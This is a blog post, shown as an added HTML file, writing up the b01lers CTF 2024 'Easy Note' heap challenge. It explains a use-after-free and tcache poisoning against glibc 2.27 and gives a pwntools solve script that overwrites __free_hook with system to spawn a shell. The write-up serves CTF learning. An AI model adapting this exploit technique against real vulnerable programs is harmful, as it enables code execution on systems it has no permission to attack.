@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="generator" content="Hugo 0.124.1">
+
+  <title>Easy Note - B01lers CTF 2024</title>
+
+  <meta name="description" content="My (assisted) solve of &#34;easy note&#34; from b01lers CTF 2024" />
+
+  <meta itemprop="name" content="Easy Note - B01lers CTF 2024">
+<meta itemprop="description" content="My (assisted) solve of &#34;easy note&#34; from b01lers CTF 2024"><meta itemprop="datePublished" content="2024-06-30T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2024-06-30T00:00:00+00:00" />
+<meta itemprop="wordCount" content="828">
+<meta itemprop="keywords" content="b01lers-ctf,pwn,binary-exploitation,heap," />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Easy Note - B01lers CTF 2024"/>
+<meta name="twitter:description" content="My (assisted) solve of &#34;easy note&#34; from b01lers CTF 2024"/>
+
+
+<meta property="og:title" content="Easy Note - B01lers CTF 2024" />
+<meta property="og:description" content="My (assisted) solve of &#34;easy note&#34; from b01lers CTF 2024" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/b01lers-ctf-2024/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-06-30T00:00:00+00:00" />
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type":"Person",
+      "@id": "http://localhost:1313/#author",
+      "name": "Salma Alandary",
+      "image": {
+        "@type":"ImageObject",
+        
+        "url": "https://avatars.githubusercontent.com/u/86086118?v=4"
+        
+      },
+      "description": "CS @ UCLA"
+    },
+    {
+      "@type": "WebSite",
+      "@id": "http://localhost:1313/#website",
+      "url": "http://localhost:1313/",
+      "name": "Salma's Site",
+      "description": "CS @ UCLA",
+      "publisher": {
+        "@id": "http://localhost:1313/#author"
+      },
+      "inLanguage": "en-us"
+    },
+    {
+      "@type": "WebPage",
+      "@id": "http://localhost:1313/posts/b01lers-ctf-2024/#webpage",
+      "url": "http://localhost:1313/posts/b01lers-ctf-2024/",
+      "name": "Easy Note - B01lers CTF 2024",
+      "isPartOf": {
+        "@id": "http://localhost:1313/#website"
+      },
+      "about": {
+         "@id": "http://localhost:1313/#author"
+      },
+      "datePublished": "2024-06-30T00:00:00+00:00",
+      "dateModified": "2024-06-30T00:00:00+00:00",
+      "description": "My (assisted) solve of \"easy note\" from b01lers CTF 2024",
+      "inLanguage": "en-us",
+      "potentialAction": [
+        {
+          "@type": "ReadAction",
+          "target": [
+            "http://localhost:1313/posts/b01lers-ctf-2024/"
+          ]
+        }
+      ]
+    },
+    {
+      "@type": "Article",
+      "isPartOf": {
+        "@id": "http://localhost:1313/posts/b01lers-ctf-2024/#webpage"
+      },
+      "mainEntityOfPage": {
+        "@id": "http://localhost:1313/posts/b01lers-ctf-2024/#webpage"
+      },
+      "headline": "Easy Note - B01lers CTF 2024",
+      "datePublished": "2024-06-30T00:00:00+00:00",
+      "dateModified": "2024-06-30T00:00:00+00:00",
+      "publisher": {
+        "@id": "http://localhost:1313/#author"
+      },
+      "keywords": [
+        "B01lers-Ctf",
+        "Pwn",
+        "Binary-Exploitation",
+        "Heap"
+      ],
+      "articleSection": [
+      ],
+      "inLanguage": "en-us",
+      "author": {
+        "@type": "Person",
+        "name":  null 
+      },
+      "potentialAction": [
+        {
+          "@type": "CommentAction",
+          "name": "Comment",
+          "target": [
+            "http://localhost:1313/posts/b01lers-ctf-2024/#comments"
+          ]
+        }
+      ]
+    }
+  ]
+}
+</script>
+
+
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/print.css"
+        media="print">
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/poole.css">
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/hyde.css">
+
+  
+
+
+  
+
+  <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700&display=swap">
+
+  
+
+  <link rel="apple-touch-icon-precomposed"
+        sizes="144x144"
+        href="/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  </head>
+<body>
+  <aside class="sidebar">
+  <div class="container">
+    <div class="sidebar-about">
+      
+        
+        <div class="author-image">
+          <a href="http://localhost:1313/">
+            <img src="https://avatars.githubusercontent.com/u/86086118?v=4" class="img-circle img-headshot center" alt="Profile Picture">
+          </a>
+        </div>
+        
+      
+
+      <h1>Salma&#39;s Site</h1>
+
+      
+      <p class="lead">CS @ UCLA</p>
+      
+    </div>
+
+    <nav>
+      <ul class="sidebar-nav">
+        <li>
+          <a href="http://localhost:1313/">Home</a>
+        </li>
+        <li>
+          <a href="/about-me/">About me</a>
+        </li><li>
+          <a href="/posts/">Blog</a>
+        </li>
+      </ul>
+    </nav>
+
+    <section class="social-icons">
+      
+      <a href="https://www.linkedin.com/in/salma-alandary/" rel="me" title="Linkedin" target="_blank">
+        <i class="fa fa-linkedin" aria-hidden="true"></i>
+      </a>
+      
+      <a href="https://github.com/ssalandary" rel="me" title="GitHub" target="_blank">
+        <i class="fa fa-github" aria-hidden="true"></i>
+      </a>
+      
+      <a href="https://twitter.com/DalSalma" rel="me" title="Twitter" target="_blank">
+        <i class="fa fa-twitter" aria-hidden="true"></i>
+      </a>
+      
+      <a href="mailto:ssalandary@gmail.com" rel="me" title="Mail" target="_blank">
+        <i class="fa fa-envelope" aria-hidden="true"></i>
+      </a>
+      
+    </section>
+  </div>
+</aside>
+
+
+  <main class="content container">
+  <div class="post">
+  <h1 class="title">Easy Note - B01lers CTF 2024</h1>
+  
+
+  <div class="post-date">
+    <time datetime="2024-06-30T00:00:00Z">Jun 30, 2024</time> <span class="readtime">&middot; 4 min read</span>
+  </div>
+
+  <div>
+  <h2 id="background">Background</h2>
+<p>Easy Note was a pwn challenge from b01lers CTF 2024. We&rsquo;re given a chal executable with the full set of glibc mitigations enabled. I solved this challenge in collaboration with Benson Liu and with a lot of guidance from Enzo (both members of Psi Beta Rho @ UCLA).
+<img src="https://hackmd.io/_uploads/BJsJj9yw0.png" alt="image">
+Upon running the executable, we are able to allocate a note of arbitrary size to the heap, free a note, view a note, edit a note, resize a note, or exit the program.
+This challenge was built to be used with glibc version 2.27.</p>
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+<h3 id="alloc">Alloc</h3>
+<p><img src="https://hackmd.io/_uploads/Byw5T9yvR.png" alt="image">
+Chunk allocation is fairly simple. First, function <code>get_chunk_id()</code> (renamed by me) is called to ask the user for a location to allocate the note (and to ensure the location is valid and in bounds).  The size of the note is then asked for and returned with <code>get_chunk_size()</code> (using <code>sscanf</code>) and it is allocated using <code>malloc()</code>.
+Finally, the allocated chunk is stored in a global array (whose base offset is located at <code>&amp;dat_4040</code>).</p>
+<h3 id="free">Free</h3>
+<p><img src="https://hackmd.io/_uploads/r1gcRcJPR.png" alt="image">
+The index of the desired chunk is checked for validity (using <code>get_chunk_id()</code>), then freed. Note - this does not prevent a double free. Futhermore, it does not clear the contents of the note before freeing the chunk.</p>
+<h3 id="view">View</h3>
+<p><img src="https://hackmd.io/_uploads/r1BJJjkP0.png" alt="image">
+The index of the desired chunk is checked for validity, then the contents are displayed to the user using <code>puts</code>.</p>
+<h3 id="edit">Edit</h3>
+<p><img src="https://hackmd.io/_uploads/BJO7JiyvR.png" alt="image">
+The index of the desired chunk is checked for validity (as is the size of the desired edit). The current note is then edited with the provided user input. Note that there is no check in place to ensure that the chunk can handle an edit of the provided size.</p>
+<h3 id="resize">Resize</h3>
+<p><img src="https://hackmd.io/_uploads/SkpOki1PC.png" alt="image">
+The index of the desired chunk is checked for validity. Then, realloc is called on it using the size provided by the user.</p>
+<h2 id="issues-and-exploit">Issues and Exploit</h2>
+<p>The main vulnerability that we are exploiting here is rooted in the &ldquo;free&rdquo; function not clearing the data of a chunk before freeing it, leading to a &ldquo;Use after Free&rdquo; (UaF).
+Given that this challenge was written using glibc 2.27, we are able to take advantage of the still-present <code>__free_hook</code> (containing a pointer to the function that free uses whenever it is called).  If we&rsquo;re able to leak the address of libc and overwrite <code>__free_hook</code> with <code>/bin/sh</code>, we&rsquo;ll be able to pop a shell and cat the flag.</p>
+<h3 id="exploit-background">Exploit Background</h3>
+<h4 id="bins">Bins</h4>
+<p>When heap chunks are freed, the heap manager must keep track of the freed chunks internally so they can be reused by malloc during allocation requests. There are 5 types of &ldquo;bins&rdquo; the heap manager can store a freed chunk in. These are the small bin, large bin, fast bin, unsorted bin, and tcache bin.  Most relevantly to this challenge, the unsorted bin holds free chunks of any size (which are linked together with forward and backward pointers). Chunks are linked into the unsorted bin if they are either outside of fastbin range (size &gt;= 0x90) or outside of tcache range (if tcache is present, &gt;= 0x420).
+If we can create and free our top chunk such that it ends up in unsorted bin, it will point into libc.  We can then calculate the libc base and write to <code>__free_hook</code></p>
+<h4 id="chunk-consolidation">Chunk Consolidation</h4>
+<p>Chunk consolidation is the process of merging two or more free chunks on the heap into a larger free chunk to avoid fragmentation. This can become an issue when trying to take advantage of a UaF - thus, we can create &ldquo;barrier&rdquo; chunks (small chunks that are not freed) in between relevant chunks we are using to prevent this process.</p>
+<h3 id="final-exploit">Final Exploit</h3>
+<p>The final path of our exploit is as such:</p>
+<ol>
+<li>Allocate a chunk of size 0x420 or greater (to ensure it enters the unsorted bin).</li>
+<li>Free it</li>
+<li>Read the freed pointer from unsorted bin to get a pointer to libc</li>
+<li>Calculate the libc base</li>
+<li>Use libc base to write to <code>__free_hook</code>, <code>system</code>.</li>
+<li>Write <code>/bin/sh</code> to some chunl</li>
+<li>Call <code>free</code> with pointer to the chunk containing <code>bin/sh</code> to get a shell</li>
+<li>Profit</li>
+</ol>
+<h3 id="solve-script">Solve Script</h3>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">#!/usr/bin/env python3
+from pwn import *
+
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+
+exe = ELF(&#34;./chal_patched&#34;)
+ld = ELF(&#34;./ld-2.27.so&#34;)
+libc = ELF(&#34;./libc.so.6&#34;)
+
+REMOTE = True
+
+r = remote(&#39;gold.b01le.rs&#39;, 4001) if REMOTE else process([exe.path])
+# gdb.attach(r)
+
+PROMPT = b&#34;-----Resize----&#34; if REMOTE else b&#34;&gt;&#34;
+
+def alloc(idx, size):
+    r.sendlineafter(PROMPT, b&#34;1&#34;)
+    r.sendlineafter(b&#34;Where? &#34;, str(idx).encode())
+    r.sendlineafter(b&#34;size? &#34;, str(size).encode())
+
+def free(idx):
+    r.sendlineafter(PROMPT, b&#34;2&#34;)
+    r.sendlineafter(b&#34;Where? &#34;, str(idx).encode())
+
+def view(idx):
+    r.sendlineafter(PROMPT, b&#34;3&#34;)
+    r.sendlineafter(b&#34;Where? &#34;, str(idx).encode())
+    return r.recvline().strip()
+
+def edit(idx, data):
+    r.sendlineafter(PROMPT, b&#34;4&#34;)
+    r.sendlineafter(b&#34;Where? &#34;, str(idx).encode())
+    r.sendafter(b&#34;size? &#34;, str(len(data) + 2).encode())
+    r.send(data)
+
+def exit(r):
+    r.sendlineafter(PROMPT, b&#34;5&#34;)
+
+def resize(idx, size):
+    r.sendlineafter(PROMPT, b&#34;6&#34;)
+    r.sendlineafter(b&#34;Where? &#34;, str(idx).encode())
+    r.sendlineafter(b&#34;size? &#34;, str(size).encode())
+
+
+alloc(1, 0x420) # 0x420 is max tcache size
+alloc(2, 0x18) # barrier to prevent combining with top chunk 
+free(1)
+libc.address = u64(view(1).ljust(8, b&#34;\x00&#34;)) - 0x3afca0
+log.info(hex(libc.address))
+
+alloc(3, 0x18)
+alloc(4, 0x18)
+alloc(5, 0x18) # barrier
+
+free(3)
+free(4) # has forward pointer to 3
+
+edit(4, b&#34;\x00&#34; + p64(libc.sym.__free_hook))
+
+alloc(6, 0x18)
+alloc(7, 0x18)
+
+edit(7, b&#34;\x00&#34; + p64(libc.sym.system))
+
+alloc(8, 0x18)
+edit(8, b&#34;\x00/bin/sh\x00&#34;)
+
+free(8)
+
+r.interactive()
+</code></pre>
+  </div>
+
+  
+<div>
+  <ul class="tags">
+  <li>
+    <a href="http://localhost:1313/tags/b01lers-ctf/" class="tag-link">B01lers-Ctf</a>
+  </li>
+  
+  <li>
+    <a href="http://localhost:1313/tags/pwn/" class="tag-link">Pwn</a>
+  </li>
+  
+  <li>
+    <a href="http://localhost:1313/tags/binary-exploitation/" class="tag-link">Binary-Exploitation</a>
+  </li>
+  
+  <li>
+    <a href="http://localhost:1313/tags/heap/" class="tag-link">Heap</a>
+  </li>
+  </ul>
+</div>
+
+
+
+  <div class="share-buttons">
+  <a class="twitter-share-button"
+     href="#"
+     title="Share on Twitter"
+     data-url="http://localhost:1313/posts/b01lers-ctf-2024/"
+     data-text="Easy Note - B01lers CTF 2024"><i class="fab fa-twitter"></i></a>
+
+  <a class="linkedin-share-button"
+     href="#"
+     title="Share on LinkedIn"
+     data-url="http://localhost:1313/posts/b01lers-ctf-2024/"
+     data-text="Easy Note - B01lers CTF 2024"><i class="fab fa-linkedin-in"></i></a>
+
+  <a class="facebook-share-button"
+     href="#"
+     title="Share on Facebook"
+     data-url="http://localhost:1313/posts/b01lers-ctf-2024/"
+     data-text="Easy Note - B01lers CTF 2024"><i class="fab fa-facebook"></i></a>
+
+  <a class="telegram-share-button"
+     href="#"
+     title="Share on Telegram"
+     data-url="http://localhost:1313/posts/b01lers-ctf-2024/"
+     data-text="Easy Note - B01lers CTF 2024"><i class="fab fa-telegram"></i></a>
+
+  <a class="pinterest-share-button"
+     href="#"
+     title="Share on Pinterest"
+     data-url="http://localhost:1313/posts/b01lers-ctf-2024/"
+     data-text="Easy Note - B01lers CTF 2024"><i class="fab fa-pinterest"></i></a>
+</div>
+
+
+  
+</div>
+  </main>
+
+  <footer>
+  <div>
+    <p>
+      &copy;  2024
+
+      
+
+      
+    </p>
+  </div>
+</footer>
+
+
+  <script src="https://kit.fontawesome.com/97c585caf6.js" crossorigin="anonymous"></script>
+
+
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/soho.js"></script>
+
+  
+
+    
+</body>
+</html>
